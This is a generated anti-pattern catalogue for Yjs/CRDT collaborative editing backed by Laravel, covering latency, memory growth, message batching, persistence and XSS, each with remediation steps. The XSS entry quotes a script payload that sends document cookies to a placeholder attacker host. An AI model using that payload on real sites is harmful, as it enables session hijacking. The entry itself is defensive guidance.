# ECC Anti-Patterns — Collaborative Editing with Yjs/CRDT

---

## Metadata

| Field | Value |
|-------|-------|
| **Domain** | Real-Time Systems |
| **Subdomain** | Collaborative Editing |
| **Knowledge Unit** | Collaborative Editing with Yjs/CRDT |
| **Generated** | 2026-06-03 |

---

## Anti-Pattern Inventory

1. Using Laravel Broadcasting for CRDT Synchronization
2. No Yjs Garbage Collection (Unbounded Tombstone Growth)
3. Unbatched Keystroke Messages (WebSocket Flood)
4. No Document Snapshots (State Lost on Restart)
5. No CRDT Content Sanitization (XSS Risk)

---

## Repository-Wide Anti-Patterns

- God Services
- Overengineering

---

## Anti-Pattern 1: Using Laravel Broadcasting for CRDT Synchronization

### Category
Architecture

### Description
Attempting to handle Yjs CRDT synchronization through Laravel's broadcasting system (Reverb, Pusher) instead of using a dedicated y-websocket relay, causing unacceptable latency and data corruption.

### Warning Signs
- CRDT updates sent as Laravel broadcast events
- High latency between keystroke and remote display
- Document state diverges between users
- Yjs update data serialized through PHP broadcasting
- Broadcasting queue workers overwhelmed with CRDT operations

### Why It Is Harmful
Laravel broadcasting is designed for server-to-client event push at human-perceivable rates (1-5s dashboard updates), not for the low-latency, high-frequency binary operations required by CRDT synchronization. CRDT updates are binary, high-frequency (every keystroke), and must arrive in order. Routing through Laravel's queue system adds seconds of latency, and serializing binary Yjs updates through PHP JSON encoding corrupts the data.

### Real-World Consequences
A team tries to implement collaborative editing by broadcasting Yjs update events through Laravel. Each keystroke goes: PHP event -> queue -> broadcast driver -> Redis pub/sub -> Reverb -> client. Latency is 2-5 seconds per keystroke. After 30 seconds of typing, document states diverge because updates arrive out of order. The feature is unusable.

### Preferred Alternative
Deploy a dedicated y-websocket relay (Node.js) for CRDT synchronization. Use Laravel only for document persistence and API.

### Refactoring Strategy
1. Deploy y-websocket relay as a separate Node.js service
2. Connect frontend Yjs directly to y-websocket via `WebsocketProvider`
3. Remove CRDT-related broadcast events from Laravel
4. Use Laravel API only for snapshot persistence and metadata

### Detection Checklist
- [ ] CRDT updates routed through Laravel broadcasting
- [ ] High latency between keystrokes and remote display
- [ ] Document state divergence across users

### Related Rules
- (Rule: Never use Laravel broadcasting for CRDT synchronization)

---

## Anti-Pattern 2: No Yjs Garbage Collection (Unbounded Tombstone Growth)

### Category
Performance

### Description
Using Yjs without enabling garbage collection, allowing tombstones (deleted characters) to accumulate in the document state indefinitely and causing unbounded memory growth.

### Warning Signs
- `doc.gc` set to `false` or unset
- Document memory usage grows linearly with total edits
- Long-lived documents consume hundreds of MB
- Yjs state size much larger than the visible document content

### Why It Is Harmful
CRDTs preserve deleted content as tombstones to maintain convergence properties. Without garbage collection, every character ever typed and deleted remains in memory. A document with 10,000 total keystrokes and 2,000 current characters has 8,000 tombstones in memory. Over hours or days of editing, tombstone count grows without bound, eventually causing memory exhaustion.

### Real-World Consequences
A collaborative document is edited by 5 users for 8 hours. Total edits: 50,000 operations. Current document: 2,000 characters. Tombstones: 48,000. Memory usage of the Yjs document: 120MB. After a week, the document has 300,000 operations and the browser tab consumes 800MB — causing crashes.

### Preferred Alternative
Enable Yjs garbage collection with `doc.gc = true` and schedule periodic compaction during low-activity periods.

### Refactoring Strategy
1. Enable GC: `const doc = new Y.Doc(); doc.gc = true;`
2. For long-lived documents, schedule explicit compaction during low activity
3. Monitor document memory usage over time
4. Verify memory stabilizes instead of growing linearly

### Detection Checklist
- [ ] `doc.gc` not enabled
- [ ] Document memory grows linearly over time
- [ ] Tombstone count exceeds current document content

### Related Rules
- (Rule: Always enable periodic garbage collection)

---

## Anti-Pattern 3: Unbatched Keystroke Messages (WebSocket Flood)

### Category
Performance

### Description
Sending every individual keystroke as a separate WebSocket message through the Yjs network provider without batching, flooding the network with tiny frames and increasing overhead per operation.

### Warning Signs
- WebSocket messages per second equals keystroke rate
- High WebSocket message overhead (headers > data payload)
- Network tab shows hundreds of small WebSocket frames per second
- No debouncing or batching in client Yjs update handling

### Why It Is Harmful
Each WebSocket message incurs framing overhead (2-10 bytes), TLS record overhead, and TCP packet overhead regardless of payload size. Sending 1 character per message means 10-50 bytes of overhead for 1 byte of CRDT data. At 5 keystrokes/second, this creates 250 bytes/second overhead per client — multiplied by hundreds of concurrent editors, this floods the WebSocket relay with tiny messages.

### Real-World Consequences
100 users typing simultaneously at 5 keystrokes/second generates 500 WebSocket messages/second. Each message has ~20 bytes overhead for ~5 bytes of CRDT data. The y-websocket relay processes 500 messages/second, with 80% of processing spent on message framing and parsing rather than CRDT logic.

### Preferred Alternative
Buffer client operations for 50-100ms before sending, grouping multiple keystrokes into a single batch update.

### Refactoring Strategy
1. Implement a buffer that accumulates Yjs updates
2. Flush the buffer every 50-100ms via `setInterval`
3. Send only buffered updates at each interval
4. Measure reduction in WebSocket message count

### Detection Checklist
- [ ] Each keystroke generates a separate WebSocket message
- [ ] High message rate correlated with typing activity
- [ ] No batching or debouncing implemented

### Related Rules
- (Rule: Always batch client operations before sending)

---

## Anti-Pattern 4: No Document Snapshots (State Lost on Restart)

### Category
Reliability

### Description
Running a Yjs collaborative editing system without persisting document state snapshots, causing all document content to be lost on server restart or crash.

### Warning Signs
- y-websocket relay restarts lose all document data
- No periodic `Y.encodeStateAsUpdate` calls
- No persistence endpoint in Laravel for CRDT state
- Document recovery impossible after server restart

### Why It Is Harmful
y-websocket relay keeps document state in memory only. A server restart, crash, or redeployment clears all document content. Without periodic snapshots persisted to a database (via Laravel API), the entire editing history of all documents is permanently lost. Users see empty documents after restart.

### Real-World Consequences
A team deploys collaborative editing with y-websocket but forgets persistence. A developer restarts the relay for a configuration change. All 50 active documents — containing 3 hours of team meeting notes each — are erased. Users see blank documents on reconnect. No recovery possible.

### Preferred Alternative
Implement periodic snapshots using `Y.encodeStateAsUpdate()` and persist them to the Laravel API at regular intervals.

### Refactoring Strategy
1. Add a timer on the relay to snapshot every 30 seconds
2. Send snapshots to Laravel API: `POST /api/documents/{id}/sync`
3. On document load, restore from last snapshot
4. Test crash recovery by killing and restarting the relay

### Detection Checklist
- [ ] No persistence of Yjs document state
- [ ] State lost on relay restart
- [ ] No `Y.encodeStateAsUpdate` calls

### Related Rules
- (Rule: Always persist document snapshots for recovery)

---

## Anti-Pattern 5: No CRDT Content Sanitization (XSS Risk)

### Category
Security

### Description
Rendering CRDT document content directly in the browser without sanitization, allowing malicious content embedded in shared documents to execute XSS attacks in all viewers' browsers.

### Warning Signs
- CRDT content rendered with `innerHTML` or `v-html`
- No DOMPurify or sanitization library used
- User-generated content in collaborative documents rendered unsanitized
- No content security policy restricting script execution

### Why It Is Harmful
CRDT documents store user-generated content that is broadcast to all viewers without server-side inspection. Any user can embed malicious JavaScript in a shared document. Since the content is trusted and rendered by the collaborative editing library, this bypasses many standard XSS protections. All document viewers execute the injected code.

### Real-World Consequences
A user embeds `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>` in a collaborative document. All 10 users currently viewing the document have their session cookies exfiltrated. The attacker uses these cookies to impersonate users and access their accounts.

### Preferred Alternative
Sanitize all CRDT content with DOMPurify or similar before rendering, and implement a Content Security Policy.

### Refactoring Strategy
1. Import DOMPurify on the frontend
2. Wrap all CRDT content rendering: `element.innerHTML = DOMPurify.sanitize(ytext.toString())`
3. Implement CSP header with `script-src 'self'`
4. Test XSS payloads to confirm they are stripped

### Detection Checklist
- [ ] CRDT content rendered without sanitization
- [ ] No DOMPurify or equivalent
- [ ] XSS payloads execute in document viewer

### Related Rules
- (Rule: Always sanitize CRDT content on output)
